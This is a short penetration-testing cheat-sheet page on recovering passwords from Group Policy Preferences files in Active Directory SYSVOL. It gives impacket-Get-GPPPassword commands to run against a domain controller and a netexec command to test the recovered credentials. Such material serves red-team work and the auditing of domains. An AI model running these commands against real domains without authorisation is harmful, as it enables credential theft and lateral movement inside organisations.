---
description: Finding Passwords in SYSVOL & Exploiting Group Policy Preferences
---

# Group Policy Preferences

There is already bunch of article that discuss about this topic. Some of them are:

* [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)
* [https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/](https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/)
* [https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/](https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/)

The quickest way to hunting credentials from GPP is using **impacket-Get-GPPPassword**.

```bash
# with a NULL session
impacket-Get-GPPPassword -no-pass 'DOMAIN_CONTROLLER'
# with cleartext credentials
impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgr7NnRX2_ebMwQMG0YN77lW_mHkWruGhf6y_tuFVhpNnoterUZVGDdaGb_6684gvzDYJSlmzp_TwiMam_Uf9xAr8grRLcHyA4cfDevSBybUX9PyXc7_0kE6Fk_eImkIt-z04qd8zsEaw4BxxAuag-ZpekA7lcBTHMpuwYx-5RjItqoYnu46Cr37uSgfxU/s1008/loot%20gpp%20password.png" alt=""><figcaption><p>cPassword</p></figcaption></figure>

And then, you can verify the credentials using NetExec or Evil-WinRM.

{% code overflow="wrap" %}
```bash
netexec smb TARGET -u 'username' -p 'password'
```
{% endcode %}
